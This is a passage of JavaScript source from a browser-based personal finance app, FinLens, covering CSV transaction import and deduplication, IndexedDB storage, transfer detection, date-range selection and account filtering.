          } else if (kind === 'bank_savings') {
            accountId = 'bank_savings'; accountName = 'Bank Savings';
          } else if (kind === 'bank_checking') {
            accountId = 'bank_checking'; accountName = 'Bank Checking';
          } else {
            accountId = 'acct_' + file.name.replace(/\.csv$/i,'').replace(/[^a-z0-9]+/g,'_');
            accountName = file.name;
          }

          // Normalize all rows. Truly identical rows (same hash inputs) are counted within
          // this file: the 2nd copy gets an _2 suffix, the 3rd _3, and so on. Counting per
          // file (never against the database) keeps IDs identical across re-uploads, so
          // DB.importTransactions() can simply skip IDs it already holds. Schemas with a
          // bank-assigned Time column (checking/savings) opt out: an identical row there is a true
          // duplicate, so only the first copy is kept.
          const allowSuffix = schema.allowOccurrenceSuffix ?? !schema.columns.time;
          const txs = [];
          const seen = {};
          for (const r of rows) {
            let tx = normalizeRow(r, schema, accountId);
            if (!tx) continue;
            const n = seen[tx.id] = (seen[tx.id] || 0) + 1;
            if (n > 1) {
              if (!allowSuffix) continue;
              tx = normalizeRow(r, schema, accountId, n);
            }
            txs.push(tx);
          }

          Object.assign(out, { schema, kind, accountId, accountName, txs });
          if (rows.length && !txs.length) out.problem = 'no-rows';
          resolve(out);
        } catch(e) {
          console.warn('parseCsvFile: could not read', file.name, '—', e.message);
          out.problem = 'unreadable'; out.txs = [];
          resolve(out);
        }
      },
      error: (e) => { out.problem = 'unreadable'; resolve(out); },
    });
  });
}

// Imports a file parseCsvFile() read: creates or updates its account (State and IndexedDB),
// adds its new rows to IndexedDB (DB.importTransactions() skips ids it already holds),
// logs the import and adds it to State.fileMeta. Returns the file's transactions;
// loadFiles() puts them in State.transactions. A failing database write is logged and the
// import carries on, so the transactions still reach memory and finlens-state.json.
async function importParsedCsv(p) {
  const { file, schema, kind, accountId, accountName, txs } = p;
  // Initialise account in State (in-memory)
  State.accounts[accountId] = State.accounts[accountId] || {
    id: accountId, name: accountName, kind, balance: null, limit: null, sourceFile: file.name
  };
  State.accounts[accountId].sourceFile = file.name;
  // Restore persisted custom label if any
  if (State.accountLabels && State.accountLabels[accountId]) {
    State.accounts[accountId].name = State.accountLabels[accountId];
  }

  // Persist to IndexedDB (if DB is ready)
  let importResult = null;
  if (typeof DB !== 'undefined' && DB._db) {
    try {
      await DB.upsertAccount({
        id: accountId,
        name: State.accounts[accountId].name,
        kind,
        schemaId: schema.id,
        sourceFile: file.name,
        displayOrder: State.accountOrder.indexOf(accountId),
        manualBalance: State.manualBalances[accountId] != null ? Number(State.manualBalances[accountId]) : null,
        creditLimit:   State.manualBalances[accountId+'_limit'] != null ? Number(State.manualBalances[accountId+'_limit']) : null,
        initialBalance: State.manualBalances[accountId+'_initial'] != null ? Number(State.manualBalances[accountId+'_initial']) : null,
      });

      importResult = await DB.importTransactions(txs, accountId, schema.id);

      await DB.logImport({
        filename: file.name,
        accountId,
        schemaId: schema.id,
        rowsFound: p.rows,
        rowsInserted: importResult.inserted,
        rowsSkipped: importResult.skipped,
        rowsRemoved: importResult.removed,
        dateRangeMin: importResult.dateRangeMin,
        dateRangeMax: importResult.dateRangeMax,
      });
    } catch(e) {
      console.warn('[FinLens] import: the browser database didn\'t take', file.name, '—', e.message);
      importResult = null;
    }
  }

  State.fileMeta.push({
    name: file.name, kind, account: State.accounts[accountId].name, rows: txs.length,
    dateRange: txs.length ? [txs[txs.length-1].date, txs[0].date] : null,
    importResult,   // may be null if DB not ready
  });

  return txs;
}

// Why a file gave no transactions, in words (loadFiles()'s result → importProblemText()).
const IMPORT_PROBLEMS = {
  'unknown-format': () => 'its columns don\'t match a format FinLens reads',
  'no-rows':        (f) => `none of its ${f.rows.toLocaleString()} row${f.rows === 1 ? '' : 's'} has a date and an amount FinLens can read`,
  'unreadable':     () => 'the browser couldn\'t read it',
  'skipped':        () => 'set to Skip',
  'empty':          () => 'it has no transactions',
};
function importFileProblem(f) {
  const k = f.problem || (f.transactions ? '' : 'empty');
  return k && IMPORT_PROBLEMS[k] ? IMPORT_PROBLEMS[k](f) : '';
}
// "a.csv: its columns don't match …; b.csv: …" for the files of a loadFiles() result
// that gave no transactions.
function importProblemText(res, sep = '; ') {
  return res.files.filter(f => importFileProblem(f)).map(f => `${f.name}: ${importFileProblem(f)}`).join(sep);
}

// Imports CSV files: reads every file first (parseCsvFile()), then imports them
// (importParsedCsv()), detects transfers and renders (v1.16.2).
// - assignments: { filename -> kind } (optional; if not provided, auto-detect; 'skip' skips the file)
// - opts.sample: these are the synthetic samples/ files (loadSampleData() in views-data.js)
// - opts.quiet: no alert when nothing could be imported; the caller says why (Rebuild)
// - opts.unopened: [{ name, error }] CSV files the caller found but couldn't open (reloadFromDirHandle())
// - opts.beforeImport(result): called after the files are read, before anything changes;
//   returning false stops the import (Rebuild from your folder checks and clears here)
// Nothing changes (State, browser storage, IndexedDB, finlens-state.json) unless at least
// one transaction was read. Up to v1.16.1 it emptied the loaded transactions first, so a
// folder with no CSV it could read left 0 transactions, and the next save wrote that to
// finlens-state.json.
// Returns { imported, reason: null|'no-csv'|'nothing-read'|'stopped', transactions,
//   files: [{ name, kind, accountId, rows, transactions, problem }] }.
async function loadFiles(fileList, assignments, opts = {}) {
  const csvs = Array.from(fileList).filter(f=>f.name.toLowerCase().endsWith('.csv'));
  const unopened = (opts.unopened || []).map(u => ({ name: u.name, kind: null, accountId: null, rows: 0, transactions: 0, problem: 'unreadable' }));
  const result = { imported: false, reason: null, transactions: 0, files: [] };
  if (!csvs.length && !unopened.length) {
    if (!opts.quiet) alert('No CSV files found.');
    return { ...result, reason: 'no-csv' };
  }
  // 1. Read every file. Nothing is changed yet.
  const read = [];
  const skipped = [];
  for (const f of csvs) {
    const kind = assignments ? assignments[f.name] : undefined;
    if (kind==='skip') { skipped.push({ name: f.name, kind: null, accountId: null, rows: 0, transactions: 0, problem: 'skipped' }); continue; }
    read.push(await parseCsvFile(f, kind));
  }
  result.files = read.map(p => ({ name: p.name, kind: p.kind, accountId: p.accountId, rows: p.rows, transactions: p.txs.length, problem: p.problem }))
    .concat(unopened, skipped);
  result.transactions = read.reduce((n, p) => n + p.txs.length, 0);
  if (!result.transactions) {
    result.reason = 'nothing-read';
    if (!opts.quiet) alert(`FinLens couldn't read any transactions from ${result.files.length === 1 ? 'this file' : 'these files'}, so nothing was changed.\n\n${importProblemText(result, '\n')}`);
    return result;
  }
  if (opts.beforeImport && (await opts.beforeImport(result)) === false) { result.reason = 'stopped'; return result; }

  // 2. Import them.
  // Any import (Reload, Reconnect, Rebuild, picking a folder or files) ends the pause
  // set by "Clear transactions & accounts". Boot never gets here while paused.
  if (State.csvAutoImportPaused) { State.csvAutoImportPaused = false; lsSet('csvAutoImportPaused', false); }
  // Your own files replace the sample data instead of being mixed into its accounts
  // (the samples use the same account ids as real checking and savings exports).
  if (State.sampleData && !opts.sample) {
    State.accounts = {};
    State.transactions = [];   // the import keeps loaded transactions (mergeImported()), so drop the samples here
    State.selectedAccounts = 'all';
    if (typeof DB !== 'undefined' && DB._db) await DB.clearStores(['transactions', 'accounts', 'import_log']);
    State.sampleData = false; lsSet('sampleData', false);
    if (typeof updateFolderBanner === 'function') updateFolderBanner();
  }
  State.fileMeta = [];
  const fresh = [];
  for (const p of read) {
    if (!p.schema || p.problem) continue;   // a file that gave no transactions creates no account
    fresh.push(...await importParsedCsv(p));
  }
  // The files' transactions join the loaded ones; none of the others is dropped (v1.16.3).
  State.transactions = await mergeImported(State.transactions, fresh);
  // Edits still saved under a transaction's id from before v1.12.0 (e.g. kept while the
  // transactions were cleared) move to its current id (migrate.js).
  const adopted = IdMigration.adoptOverrides(State.transactions);
  if (adopted.size) {
    State.transactions = State.transactions.map(t => adopted.has(t.id)
      ? reconstituteTx({ ...t, description: t._originalDesc }, State.txOverrides[t.id]) : t);
    lsSet('txOverrides', State.txOverrides);
  }
  State.transactions.sort((a,b)=>b.date-a.date);
  detectTransfers();
  // Keep accountOrder in sync: preserve existing order, append any newly loaded accounts
  const knownIds=new Set(State.accountOrder);
  const newIds=Object.keys(State.accounts).filter(id=>!knownIds.has(id));
  State.accountOrder=[...State.accountOrder.filter(id=>State.accounts[id]),...newIds];
  lsSet('accountOrder',State.accountOrder);
  State.lastRefresh = new Date();
  updateRefreshLabel();
  buildAccountFilter();
  renderActive();
  result.imported = true;
  return result;
}

// The loaded transactions after an import (v1.16.3, for loadFiles()): the files'
// transactions plus every loaded transaction they don't have. That is what IndexedDB holds
// after the same import: DB.importTransactions() adds the rows it lacks and keeps every
// other (CLAUDE.md §10). Up to v1.16.2 an import replaced all loaded transactions with
// the files' ones. Importing only the card file left only the card's transactions in
// memory, and a newer export that starts where the last one ended left only the new rows.
// The autosave wrote that to finlens-state.json, which boot loads first.
// - A loaded transaction with the id of one in the files is replaced by the file's.
// - A leftover copy goes, as importTransactions() removes it from the store: a suffixed
//   id whose base is in the files but whose exact id isn't.
// - A kept transfer leg goes back to its values before detection (undoTransferDetection()),
//   so loadFiles()'s detectTransfers() can pair it again, with a row just re-read too.
async function mergeImported(loaded, fresh) {
  const baseOf = (id) => id.replace(/_\d+$/, '');
  const ids = new Set(fresh.map(t => t.id));
  const bases = new Set(fresh.map(t => baseOf(t.id)));
  const kept = loaded.filter(t => !ids.has(t.id) && !(t.id !== baseOf(t.id) && bases.has(baseOf(t.id))));
  // A transfer from a ≤v1.16.0 finlens-state.json doesn't record its CSV type and
  // category; its IndexedDB row does, when this browser has one.
  const known = (t) => t._originalType && Array.isArray(t._originalCategories) && t._originalCategories.length;
  let rows = new Map();
  if (kept.some(t => t.type === 'transfer' && !known(t)) && typeof DB !== 'undefined' && DB._db) {
    rows = new Map((await DB._getAllTransactions()).map(r => [r.id, r]));
  }
  kept.forEach(t => undoTransferDetection(t, rows.get(t.id)));
  return kept.concat(fresh);
}

// Puts a transfer found by detectTransfers() back to what an import makes before detection
// (v1.16.3): its CSV type and category (_originalType, _originalCategories), with its edit.
// Detection only pairs transactions that aren't transfers yet, so a leg kept by
// mergeImported() must go back first or its partner, re-read from a file, stays unpaired.
// A type the user set to transfer stays. Without the CSV values (a transaction from a
// ≤v1.16.0 finlens-state.json), its IndexedDB `row` gives them; without a row, the type
// goes back to debit or credit by its sign and the category is worked out from the
// description, as Clear transaction edits does. Changes `t` in place, as detection does.
function undoTransferDetection(t, row) {
  const ov = State.txOverrides[t.id] || {};
  if (t.type !== 'transfer' || ov.type === 'transfer') return;
  const has = (c, ty) => Array.isArray(c) && c.length > 0 && !!ty;
  let cats = t._originalCategories, type = t._originalType;
  if (!has(cats, type) && row) { cats = row.categories; type = row.type; }
  if (!has(cats, type)) {
    const keep = (t.categories || []).filter(c => c !== 'Transfer out' && c !== 'Transfer in');
    cats = keep.length ? keep : [autoCategory(t._originalDesc || t.description)];
    type = t.amount < 0 ? 'debit' : 'credit';
  }
  t.type = ov.type || type;
  t.categories = ov.categories && ov.categories.length ? [...ov.categories] : (ov.category ? [ov.category] : [...cats]);
}

function detectTransfers() {
  // Build keyword regex from user-editable list (falls back to defaults if empty)
  const kws = (State.transferKeywords && State.transferKeywords.length)
    ? State.transferKeywords
    : DEFAULT_TRANSFER_KEYWORDS;
  const escapedKws = kws.map(k => k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
  const key = new RegExp(escapedKws.join('|'), 'i');
  const cands = State.transactions.filter(t=>t.type!=='transfer');
  const used = new Set();
  // Pass 1: match paired transfers across accounts
  for (let i=0;i<cands.length;i++) {
    if (used.has(cands[i].id)) continue;
    for (let j=i+1;j<cands.length;j++) {
      if (used.has(cands[j].id)) continue;
      const a=cands[i], b=cands[j];
      if (a.account===b.account) continue;
      if (Math.abs(Math.abs(a.amount)-Math.abs(b.amount))>1) continue;
      if (Math.sign(a.amount)===Math.sign(b.amount)) continue;
      const days = Math.abs((a.date-b.date)/(1000*60*60*24));
      if (days>2) continue;
      if (!key.test(a.description) && !key.test(b.description) && days>1) continue;
      const outTx=a.amount<0?a:b, inTx=a.amount<0?b:a;
      outTx.type='transfer'; inTx.type='transfer';
      outTx.categories=['Transfer out']; inTx.categories=['Transfer in'];
      used.add(a.id); used.add(b.id);
      break;
    }
  }
  // Pass 2: mark unmatched transactions whose description screams "transfer"
  for (const t of cands) {
    if (used.has(t.id)) continue;
    if (key.test(t.description)) {
      t.type='transfer';
      t.categories=[t.amount<0?'Transfer out':'Transfer in'];
    }
  }
}

function updateRefreshLabel() {
  const el = $('#lastRefresh');
  if (!el) return;
  if (State.lastRefresh) {
    el.textContent = 'Refreshed '+dayjs(State.lastRefresh).format('MMM D, h:mm A');
  } else {
    el.textContent = 'No data loaded';
  }
}

/* ---------- DATE RANGE ---------- */
function setRange(mode, start, end) {
  const now = new Date();
  if (mode==='week') {
    // This Week: Sunday of current week → now
    const s=new Date(now); s.setDate(s.getDate()-now.getDay()); s.setHours(0,0,0,0);
    State.range={mode,start:s,end:now};
  } else if (mode==='pastweek') {
    // Past Week: rolling 7 days
    const s=new Date(now); s.setDate(s.getDate()-7); s.setHours(0,0,0,0);
    State.range={mode,start:s,end:now};
  } else if (mode==='month') {
    State.range={mode,start:startOfMonth(now),end:endOfMonth(now)};
  } else if (mode==='lastmonth') {
    const s=startOfMonth(new Date(now.getFullYear(),now.getMonth()-1,1));
    const e=endOfMonth(s);
    State.range={mode,start:s,end:e};
  } else if (mode==='last3months') {
    const s=new Date(now); s.setMonth(s.getMonth()-3); s.setHours(0,0,0,0);
    State.range={mode,start:s,end:now};
  } else if (mode==='last6months') {
    const s=new Date(now); s.setMonth(s.getMonth()-6); s.setHours(0,0,0,0);
    State.range={mode,start:s,end:now};
  } else if (mode==='ytd'||mode==='year') {
    // YTD: Jan 1 of current year → now
    State.range={mode:'ytd',start:new Date(now.getFullYear(),0,1),end:now};
    mode='ytd';
  } else if (mode==='lastyear') {
    const y=now.getFullYear()-1;
    State.range={mode,start:new Date(y,0,1),end:new Date(y,11,31,23,59,59)};
  } else if (mode==='all') {
    State.range={mode,start:null,end:null};
  } else if (mode==='custom') {
    State.range={mode,
      start:start?new Date(start+'T00:00:00'):null,
      end:end?new Date(end+'T23:59:59'):null};
  }
  const rl = $('#rangeLabel'); if (rl) rl.textContent=describeRange();
  // Sync the app bar's date-range popover (ui.js)
  if (typeof updateRangeUI==='function') updateRangeUI();
  renderActive();
}

function describeRange() {
  const r=State.range;
  if (r.mode==='all'||(!r.start&&!r.end)) return 'All time';
  const MODE_LABELS={week:'This Week',pastweek:'Past 7 Days',month:'This Month',
    lastmonth:'Last Month',last3months:'Last 3 Months',last6months:'Last 6 Months',
    ytd:'Year to Date',lastyear:'Last Year'};
  if (r.mode&&MODE_LABELS[r.mode]) return MODE_LABELS[r.mode];
  const s=r.start?dayjs(r.start).format('MMM D, YYYY'):'…';
  const e=r.end?dayjs(r.end).format('MMM D, YYYY'):'today';
  return s+' – '+e;
}

function inRange(tx) {
  const r=State.range;
  if (!r.start&&!r.end) return true;
  if (r.start&&tx.date<r.start) return false;
  if (r.end&&tx.date>r.end) return false;
  return true;
}

function inAccount(tx) {
  if (State.selectedAccounts==='all') return true;
  if (Array.isArray(State.selectedAccounts)) return State.selectedAccounts.includes(tx.account);
  return tx.account===State.selectedAccounts;
}

function filteredTx() { return State.transactions.filter(t=>inRange(t)&&inAccount(t)); }

/* ---------- ACCOUNT FILTER ---------- */
// The app bar's Accounts popover: one checkbox per account. State.selectedAccounts is
// 'all' or the ids that are checked; selections for accounts that are gone are dropped.
function buildAccountFilter() {
  const list=$('#acctList'); if (!list) return;
  const accts=orderedAccounts();
  if (Array.isArray(State.selectedAccounts)) {
    const ids=new Set(accts.map(a=>a.id));
    State.selectedAccounts=State.selectedAccounts.filter(id=>ids.has(id));
    if (!State.selectedAccounts.length || State.selectedAccounts.length===accts.length) State.selectedAccounts='all';
  }
  const all=State.selectedAccounts==='all';
  list.innerHTML = accts.length
    ? accts.map(a=>`<label class="chk"><input type="checkbox" data-acct="${escapeAttr(a.id)}" ${all||State.selectedAccounts.includes(a.id)?'checked':''}><span>${escapeHtml(State.accountLabels?.[a.id]||a.name)}</span></label>`).join('')
    : '<div class="muted" style="padding:6px 10px;font-size:13px">No accounts yet. Import CSVs in Settings → Import.</div>';
  if (typeof updateAcctUI==='function') updateAcctUI();
}

/* Return accounts in user-defined display order (falls back to insertion order). */
function orderedAccounts() {
  const all=Object.values(State.accounts);
  if (!State.accountOrder||!State.accountOrder.length) return all;
  const pos={};
  State.accountOrder.forEach((id,i)=>pos[id]=i);
  return [...all].sort((a,b)=>(pos[a.id]??999)-(pos[b.id]??999));
}

/* ---------- MISC UTILITIES ---------- */
function emptyCard(msg) { return `<div class="card"><div class="empty"><p>${msg}</p></div></div>`; }
